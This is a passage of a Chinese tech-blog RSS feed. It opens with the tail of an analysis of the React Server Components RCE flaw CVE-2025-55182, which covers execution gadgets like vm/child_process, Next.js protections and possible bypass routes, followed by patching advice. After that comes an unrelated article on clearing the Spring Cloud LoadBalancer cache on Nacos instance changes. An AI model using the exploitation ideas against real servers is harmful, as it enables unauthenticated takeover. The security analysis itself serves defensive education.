<span class="hljs-comment">// 返回：function anonymous() { return 1+1 }</span>
<span class="hljs-comment">// 不会执行！</span>
</code></pre>
<p>而 <code>vm.runInThisContext('1+1')</code> 会<strong>立即执行</strong>并返回结果：</p>
<pre><code class="hljs language-javascript" lang="javascript">vm.<span class="hljs-title function_">runInThisContext</span>(<span class="hljs-string">'1+1'</span>)
<span class="hljs-comment">// 返回：2（已执行）</span>
</code></pre>
<p>这就是为什么攻击者需要 <code>vm</code> 或 <code>child_process</code> 这样的"执行型"gadget。</p>
<h3 data-id="heading-32">Next.js 的额外保护</h3>
<p>在 Next.js 中，攻击难度更高，因为：</p>
<ol>
<li><strong>Manifest 验证</strong>：Next.js 的 manifest 只包含注册的 Server Action 哈希，不包含原始模块引用</li>
<li><strong>框架层验证</strong>：<code>resolveServerReference()</code> 会在调用 <code>requireModule()</code> 之前进行验证</li>
<li><strong>模块隔离</strong>：危险模块通常不会被打包到 Server Components bundle 中</li>
</ol>
<p>但这不意味着 Next.js 应用完全安全——如果攻击者能够：</p>
<ul>
<li>劫持现有的 action ID</li>
<li>利用 manifest 的原型污染</li>
<li>找到 bundler 的特殊行为</li>
</ul>
<p>仍然可能实现攻击。</p>
<h2 data-id="heading-33">📚 相关资源</h2>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Freact.dev%2Fblog%2F2025%2F12%2F03%2Fcritical-security-vulnerability-in-react-server-components" target="_blank" title="https://react.dev/blog/2025/12/03/critical-security-vulnerability-in-react-server-components" ref="nofollow noopener noreferrer">React 官方安全公告</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.cve.org%2FCVERecord%3Fid%3DCVE-2025-55182" target="_blank" title="https://www.cve.org/CVERecord?id=CVE-2025-55182" ref="nofollow noopener noreferrer">CVE-2025-55182 详细信息</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fnextjs.org%2Fblog%2FCVE-2025-66478" target="_blank" title="https://nextjs.org/blog/CVE-2025-66478" ref="nofollow noopener noreferrer">Next.js 官方安全公告</a></li>
</ul>
<h2 data-id="heading-34">⚠️ 总结</h2>
<p>CVE-2025-55182 是一个<strong>极其严重</strong>的漏洞，CVSS 10.0 的评分意味着：</p>
<ul>
<li>✅ <strong>无需身份验证</strong>即可利用</li>
<li>✅ <strong>远程代码执行</strong>，完全控制服务器</li>
<li>✅ <strong>影响广泛</strong>，几乎所有使用 React Server Components 的应用</li>
</ul>
<p><strong>如果你在使用 React Server Components，请立即：</strong></p>
<ol>
<li>✅ 检查你的 React 版本</li>
<li>✅ 升级到修复版本</li>
<li>✅ 检查依赖中是否包含危险模块</li>
<li>✅ 配置 WAF 规则（如果可能）</li>
<li>✅ 监控异常请求</li>
</ol>
<p>安全无小事，及时更新是关键！🔐</p>
<hr/>
<p><strong>作者注</strong>：本文基于 React 官方安全公告和实际漏洞研究编写。如果你发现了本文中的错误或需要补充，欢迎指正。</p>
<p><strong>免责声明</strong>：本文仅用于安全研究和教育目的。请勿将本文中的技术用于非法用途。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[项目部署时接口短暂访问异常问题修复：Nacos+Gateway活跃节点监听]]></title>    <link>https://juejin.cn/post/7579553111473176630</link>    <guid>https://juejin.cn/post/7579553111473176630</guid>    <pubDate>2025-12-04T05:31:11.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579553111473176630" data-draft-id="7579562420978483241" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="项目部署时接口短暂访问异常问题修复：Nacos+Gateway活跃节点监听"/> <meta itemprop="keywords" content="后端,Spring Cloud"/> <meta itemprop="datePublished" content="2025-12-04T05:31:11.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="milixiang"/> <meta itemprop="url" content="https://juejin.cn/user/3861942401246727"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            项目部署时接口短暂访问异常问题修复：Nacos+Gateway活跃节点监听
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3861942401246727/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    milixiang
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-04T05:31:11.000Z" title="Thu Dec 04 2025 05:31:11 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">解决微服务部署的连接拒绝难题：Nacos活跃节点监听实战</h2>
<h3 data-id="heading-1">1. 背景介绍</h3>
<p>在微服务架构中，服务注册与发现是核心组件之一。Nacos作为阿里巴巴开源的服务注册与发现中心，提供了强大的服务管理能力。在Spring Cloud Gateway场景下，实时感知服务实例的变化对于负载均衡和服务可用性至关重要。</p>
<p>在实际应用中，我们可能会遇到这样的问题：一直以为Alibaba Nacos会自动监听处理缓存信息，但最近在环境部署时偶发"finishConnect(..) failed: Connection refused"报错。经过排查发现，这是因为Spring Cloud LoadBalancer缓存了旧的服务实例信息，当服务实例发生变化时，缓存没有及时更新，导致负载均衡器仍然向已下线的实例发送请求，从而引发连接拒绝错误。</p>
<h3 data-id="heading-2">1.1 问题排查过程</h3>
<h4 data-id="heading-3">1.1.1 问题现象</h4>
<p>在微服务部署过程中，特别是在进行服务实例滚动更新或动态扩缩容时，偶发出现"finishConnect(..) failed: Connection refused: /x.x.x.x:xxxx"错误，导致部分请求失败。从报错信息中可以直接看到网关尝试连接的IP地址是已经下线的服务实例IP。</p>
<h4 data-id="heading-4">1.1.2 初步验证</h4>
<ol>
<li><strong>检查Nacos控制台</strong>：确认报错信息中的IP地址对应的服务实例确实已经下线</li>
<li><strong>检查当前在线实例</strong>：在Nacos控制台查看服务实例状态，确认有其他健康的实例在线</li>
<li><strong>验证网络连接</strong>：验证网关与在线服务实例之间的网络连接正常</li>
</ol>
<h4 data-id="heading-5">1.1.3 深入分析</h4>
<ol>
<li><strong>检查服务实例获取流程</strong>：跟踪代码发现，Spring Cloud LoadBalancer默认会缓存服务实例列表</li>
<li><strong>分析缓存更新机制</strong>：通过调试发现，当服务实例发生变化时，Nacos会发送事件通知，但Spring Cloud LoadBalancer的缓存没有及时更新</li>
<li><strong>验证缓存问题</strong>：通过查看Spring Cloud LoadBalancer的缓存内容，确认缓存中仍然包含已下线的服务实例信息</li>
</ol>
<h4 data-id="heading-6">1.1.4 问题验证</h4>
<p>通过在服务实例变化时手动清空Spring Cloud LoadBalancer的缓存，验证了问题的根源：缓存没有及时更新导致网关使用了旧的服务实例列表，仍然向已下线的实例发送请求。</p>
<h3 data-id="heading-7">1.1.5 解决方案选型</h3>
<p>在确定问题根源后，我们开始寻找解决方案。通过网上搜索，发现大多数解决方案都是基于Ribbon实现的，例如通过配置Ribbon的刷新机制或实现Ribbon的ServerListUpdater接口来更新节点列表。</p>
<p>然而，我们的项目中并没有依赖Ribbon，而是使用了Spring Cloud LoadBalancer作为负载均衡器。因此，这些基于Ribbon的方案并不适用。</p>
<p>基于项目实际情况，我们需要设计一个基于Spring Cloud LoadBalancer和Nacos的解决方案。</p>
<h3 data-id="heading-8">1.2 解决方案设计</h3>
<p>基于以上排查结果和解决方案选型，我们设计了一个解决方案：通过监听Nacos的服务实例变化事件，在实例变化时自动清空Spring Cloud LoadBalancer的缓存，确保负载均衡器始终使用最新的服务实例信息。</p>
<p>本文将详细分析QSA Gateway中Nacos活跃节点监听的实现机制，包括代码结构、工作原理和使用场景，以及如何解决上述问题。</p>
<h3 data-id="heading-9">2. 实现原理</h3>
<p>QSA Gateway通过实现Nacos的<code>Subscriber</code>接口，监听服务实例变化事件，当服务实例发生变化时，自动清理Spring Cloud LoadBalancer的缓存，确保负载均衡器使用最新的服务实例信息。</p>
<h4 data-id="heading-10">2.1 核心代码分析</h4>
<pre><code class="hljs language-java" lang="java">
<span class="hljs-keyword">import</span> org.springframework.cache.CacheManager;
<span class="hljs-keyword">import</span> org.springframework.cloud.loadbalancer.core.CachingServiceInstanceListSupplier;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Component;

<span class="hljs-keyword">import</span> com.alibaba.nacos.client.naming.event.InstancesChangeEvent;
<span class="hljs-keyword">import</span> com.alibaba.nacos.common.notify.NotifyCenter;
<span class="hljs-keyword">import</span> com.alibaba.nacos.common.notify.listener.Subscriber;

<span class="hljs-keyword">import</span> jakarta.annotation.PostConstruct;
<span class="hljs-keyword">import</span> jakarta.annotation.Resource;
<span class="hljs-keyword">import</span> lombok.extern.slf4j.Slf4j;

<span class="hljs-meta">@Component</span>
<span class="hljs-meta">@Slf4j</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">NacosInstancesChangeEventListener</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Subscriber</span>&lt;InstancesChangeEvent&gt; {
    <span class="hljs-meta">@Resource</span>
    <span class="hljs-keyword">private</span> CacheManager defaultLoadBalancerCacheManager;

    <span class="hljs-meta">@PostConstruct</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 注册当前自定义的订阅者以获取通知</span>
        NotifyCenter.registerSubscriber(<span class="hljs-built_in">this</span>);
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onEvent</span><span class="hljs-params">(InstancesChangeEvent event)</span> {
        defaultLoadBalancerCacheManager.getCache(CachingServiceInstanceListSupplier.SERVICE_INSTANCE_CACHE_NAME).evict(event.getServiceName());
        log.info(<span class="hljs-string">"service:{} 缓存已清空"</span>, event.getServiceName());
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">com</span>.alibaba.nacos.common.notify.Event&gt; subscribeType() {
        <span class="hljs-keyword">return</span> InstancesChangeEvent.class;
    }
}
</code></pre>
<h4 data-id="heading-11">2.2 工作流程</h4>
<ol>
<li>
<p><strong>注册订阅者</strong>：通过<code>@PostConstruct</code>注解的<code>init()</code>方法，将当前监听器注册到Nacos的<code>NotifyCenter</code>中，订阅<code>InstancesChangeEvent</code>事件。</p>
</li>
<li>
<p><strong>监听事件</strong>：当Nacos服务中的实例发生变化（新增、删除、健康状态变更等）时，Nacos会发布<code>InstancesChangeEvent</code>事件。</p>
</li>
<li>
<p><strong>处理事件</strong>：监听器的<code>onEvent()</code>方法被调用，获取变化的服务名称，然后清空Spring Cloud LoadBalancer中对应服务的实例缓存。</p>
</li>
<li>
<p><strong>日志记录</strong>：记录服务实例变化和缓存清空的日志，便于问题排查和监控。</p>
</li>
</ol>
<h3 data-id="heading-12">3. 技术要点</h3>
<h4 data-id="heading-13">3.1 Nacos事件机制</h4>
<p>Nacos采用了发布-订阅模式的事件机制，通过<code>NotifyCenter</code>统一管理事件的发布和订阅。核心组件包括：</p>
<ul>
<li><strong>Event</strong>：事件基类，所有Nacos事件都继承自此类</li>
<li><strong>Subscriber</strong>：订阅者接口，实现该接口可以订阅特定类型的事件</li>
<li><strong>NotifyCenter</strong>：事件中心，负责事件的发布和订阅管理</li>
</ul>
<h4 data-id="heading-14">3.2 Spring Cloud LoadBalancer缓存</h4>
<p>Spring Cloud LoadBalancer默认会缓存服务实例列表，以提高性能。但这也带来了一个问题：当服务实例发生变化时，缓存中的实例信息可能不是最新的。</p>
<p>通过监听Nacos的实例变化事件，在实例变化时主动清空缓存，可以确保负载均衡器始终使用最新的服务实例信息。</p>
<h4 data-id="heading-15">3.3 注解使用</h4>
<ul>
<li><strong>@Component</strong>：将监听器注册为Spring Bean，使其能够被Spring容器管理</li>
<li><strong>@Slf4j</strong>：Lombok注解，自动生成日志记录器</li>
<li><strong>@PostConstruct</strong>：在Bean初始化完成后执行，用于注册订阅者</li>
<li><strong>@Resource</strong>：注入Spring容器中的<code>CacheManager</code>实例</li>
</ul>
<h3 data-id="heading-16">4. 使用场景</h3>
<h4 data-id="heading-17">4.1 服务实例动态扩缩容</h4>
<p>当服务实例发生动态扩缩容时，监听器会自动感知并清空缓存，确保负载均衡器能够立即使用新的实例列表。</p>
<h4 data-id="heading-18">4.2 服务实例健康状态变更</h4>
<p>当服务实例的健康状态发生变化（如从健康变为不健康，或从不健康变为健康）时，监听器会自动清空缓存，确保负载均衡器只向健康的实例转发请求。</p>
<h4 data-id="heading-19">4.3 服务实例滚动更新</h4>
<p>在进行服务实例滚动更新时，旧实例会被逐步替换为新实例。监听器能够实时感知实例变化，确保负载均衡器始终使用最新的健康实例列表。</p>
<h3 data-id="heading-20">5. 优势与收益</h3>
<ol>
<li><strong>实时性</strong>：能够实时感知服务实例变化，确保负载均衡器使用最新的实例信息</li>
<li><strong>可靠性</strong>：通过自动清空缓存，避免了因缓存不一致导致的服务调用失败</li>
<li><strong>性能优化</strong>：在保证实时性的同时，利用了Spring Cloud LoadBalancer的缓存机制，提高了负载均衡的性能</li>
<li><strong>可维护性</strong>：代码结构清晰，易于理解和维护</li>
<li><strong>扩展性</strong>：基于Nacos的事件机制，可以方便地扩展其他类型的事件监听</li>
</ol>
<h3 data-id="heading-21">6. 总结</h3>
<p>QSA Gateway中的Nacos活跃节点监听实现，通过Nacos的事件机制和Spring Cloud LoadBalancer的缓存管理，实现了服务实例变化的实时感知和自动处理。这种设计确保了在微服务架构中，Spring Cloud Gateway能够始终使用最新的服务实例信息，有效解决了部署时偶发的"finishConnect(..) failed: Connection refused"报错问题。</p>
<p>具体来说，当服务实例发生变化时，Nacos会发布<code>InstancesChangeEvent</code>事件，监听器捕获该事件后，会自动清空Spring Cloud LoadBalancer中对应服务的实例缓存。这样，负载均衡器在下一次请求时就会重新从Nacos获取最新的实例列表，避免了向已下线的实例发送请求，从而消除了连接拒绝错误。</p>
<p>通过本文的分析，我们可以看到，在微服务架构中，合理利用服务注册与发现中心的事件机制，对于提高系统的可用性和可靠性至关重要。同时，结合缓存机制和事件监听，可以在性能和实时性之间取得良好的平衡，有效解决实际部署中遇到的连接拒绝问题。</p>
<h3 data-id="heading-22">7. 未来展望</h3>
<ol>
<li><strong>事件过滤</strong>：可以考虑根据服务名称或其他条件，对事件进行过滤，只处理特定服务的实例变化</li>
<li><strong>事件批量处理</strong>：对于频繁变化的服务，可以考虑批量处理事件，减少缓存清空的频率</li>
<li><strong>监控指标</strong>：可以添加监控指标，记录服务实例变化的频率和缓存清空的次数，便于性能分析和问题排查</li>
<li><strong>容错机制</strong>：可以添加容错机制，在缓存清空失败时进行重试或告警</li>
</ol>
<p>通过不断优化和扩展，可以进一步提高Nacos活跃节点监听的性能和可靠性，为微服务架构提供更强大的支持。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item>  </channel></rss>